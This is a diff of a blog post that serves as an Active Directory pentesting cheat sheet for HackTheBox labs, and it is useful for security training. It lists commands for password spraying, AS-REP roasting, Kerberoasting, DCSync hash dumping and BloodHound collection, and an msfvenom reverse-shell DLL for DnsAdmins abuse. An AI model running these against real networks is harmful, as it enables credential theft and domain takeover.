@@ -10,8 +10,9 @@ excerpt: "This document is a work-in-progress where I’m compiling a variety of
 ![img-description](/assets/images/active_dir.png)
 
 This document is a work-in-progress where I’m compiling a variety of techniques for enumerating and exploiting Active Directory environments. It will be updated over time with additional steps and insights as I continue to explore and refine the methodology
-# ENUMERATION TECHNICS
----
+<p style="font-size:2em; font-weight:bold; margin-bottom: 0;">ENUMERATION TECHNICS</p>
+<hr>
+
 ## ENUMERATING SMB
 ---
 **SMB (Server Message Block)** is a network file sharing protocol used in Windows environments that allows applications to read and write to files, request services from server programs, and communicate with other devices on a network. It's commonly used for sharing files and printers between computers within a local network.
@@ -78,9 +79,17 @@ crackmapexec ldap <hostname> -u <username> -p <password> --domains # Enumerate d
 crackmapexec ldap <hostname> -u <username> -p <password> --search '(&(objectClass=user)(sAMAccountName=*administrator*))' # Enumerate specific atr
 ````
 
-# VULNERABILITIES
+## ENUMERATING TLS
 ---
-## PASSWORD SPRYING WITH CRACKMAPEXEC
+TLS encrypts communication between the client and server, ensuring security. It runs on port 3269 for secure Active Directory Global Catalog queries. Enumerating it is important because it may reveal valuable information about the domain, certificates, and potential attack vectors, all while being encrypted for protection.
+
+````bash
+openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text
+````
+
+## VULNERABILITIES
+---
+### PASSWORD SPRYING WITH CRACKMAPEXEC
 ---
 **Password spraying** is a brute-force attack method where an attacker attempts to log in to multiple accounts using the same common password (e.g., "Welcome123!"). Unlike traditional brute force, which targets one account with many passwords, password spraying avoids account lockouts by testing a single password across many different accounts.
 
@@ -88,16 +97,16 @@ crackmapexec ldap <hostname> -u <username> -p <password> --search '(&(objectClas
 crackmapexec smb 10.10.10.169 -u users.txt -p 'password.txt' --continue-on-success
 ````
 
-## Kerberos pre-authentication vulnerability
+### Kerberos pre-authentication vulnerability
 ---
-### Username-anarchy
+#### Username-anarchy
 ---
 **Username-anarchy** is a tool commonly used in **Active Directory enumeration** during security assessments. It is designed to find **usernames** based on common naming conventions used within organizations. The tool tries to identify likely usernames by leveraging patterns such as the combination of first names, last names, initials, and common organizational naming formats.
 
 ````bash
 ./username-anarchy --input-file /home/whare/hackthebox/maquinas/saune/users.txt --select-format first,flast,first.last,firstl > test_users.txt
 ````
-### AS-REP attack
+#### AS-REP attack
 ---
 An **AS-REP attack** exploits the **Kerberos authentication protocol** in Active Directory environments, targeting **user accounts** without pre-existing passwords or **non-Microsoft accounts**. When these accounts attempt to authenticate, they send an **AS-REP (Authentication Service Response)** to the domain controller, which is **encrypted**. This response can be intercepted and cracked offline to reveal the user's password, making this attack particularly effective against accounts without strong protections in place.
 
@@ -116,7 +125,7 @@ impacket-GetNPUsers.py -usersfile users.txt -domain DOMAIN.local -no-pass
 kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL usernames.txt
 kerbrute userenum -d DOMAIN -i users.txt
 ````
-### Kerberoasting
+#### Kerberoasting
 ---
 **Kerberoasting** targets **service accounts** in Active Directory environments. In this attack, an attacker requests **Service Tickets (TGS)** for service accounts with a registered **Service Principal Name (SPN)**. These tickets are encrypted with the service account's password hash, and once obtained, they can be cracked offline to reveal the plaintext password of the service account. This provides attackers with access to services and potential privilege escalation.
 
@@ -126,7 +135,7 @@ kerbrute userenum -d DOMAIN -i users.txt
 impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
 ````
 
-### DC-SYNC
+#### DC-SYNC
 ---
 A **DCSync attack** is a method used to simulate the behavior of a Domain Controller (DC) in order to retrieve password hashes of domain accounts from Active Directory. This attack exploits the replication protocol used by domain controllers to synchronize directory data. By performing a DCSync attack, an attacker can request the password hashes (or even clear-text passwords, if applicable) for specific accounts without needing direct access to the DC.
 
@@ -140,16 +149,17 @@ You will need one of the following requirements, usually printed on **BLOODHOUND
 ./secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 # Dump credentials (if we have acces to them)
 ````
 
-#  ABUSE OF PRIVILEGES
+##  ABUSE OF PRIVILEGES
 ---
-## Enumerating privileges
+### Enumerating privileges
 ---
-Common commnds
+### Common commnds
+---
 ````powershell
 whoami -all
 whoami -groups
 ````
-### Bloodhound
+#### Bloodhound
 ---
 BloodHound is a tool for Active Directory auditing that helps map trust relationships, permissions, and privilege escalation paths within a domain. It visually identifies attack vectors by showing how an attacker could escalate privileges or move laterally within a network.
 
@@ -161,7 +171,7 @@ bloodhound-python -c All -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -ns 10.10.1
 
 If we can acces with WinRM: SharpHound >
 
-### SharpHound
+#### SharpHound
 ---
 SharpHound is the data collection tool used by BloodHound. It scans the Active Directory environment to gather information about users, groups, permissions, and trust relationships. The data collected is then analyzed by BloodHound.
 
@@ -170,7 +180,9 @@ We use <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.0" t
 
 **DISCLAIMER**: If you are using **BloodHound** installed from Kali's APT repository, you will need to run **SharpHound v1.1.0**. Otherwise, your data will not load properly.
 
-## AD-Recycle Bin
+## PRIVILEGED AD GROUP ABUSE
+---
+### AD-Recycle Bin
 ---
 The **AD Recycle Bin** is a feature in Active Directory that allows the recovery of deleted objects, such as users, groups, or computers, without requiring backups. Being part of this group, we can potentially enumerate and extract information from deleted objects in the domain.
 
@@ -181,7 +193,7 @@ Get-ADObject -ldapfilter "(&(ObjectClass=user)(DisplayName=TempAdmin)(isDeleted=
 Restore-ADObject -Identity <ObjectGUID> # Restore objects
 ````
 
-## Dns-Admins
+### Dns-Admins
 ---
  **DnsAdmins** group consists of users who have special permissions to manage and configure DNS settings on a Windows machine. Members of this group typically have the ability to create, modify, and delete DNS records in Active Directory-integrated zones. By default, this group does not have permission to start or stop the DNS service, but administrators can assign additional privileges to members, which may include the ability to control the DNS service.
 
@@ -193,7 +205,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f dll -o 
 
 Next steps explianed <a href="https://whare1.github.io/posts/Resolute-Writeup/" target="_blank">on resolute writeup</a>
 
-## LAPS_Readers
+### LAPS_Readers
 ---
 **LAPS_Readers** is a built-in group in Active Directory, specifically for **Local Administrator Password Solution (LAPS)**. Members of this group have **read-only access** to the local administrator passwords of managed machines in the domain. These passwords are automatically generated and stored securely in Active Directory by LAPS.
 
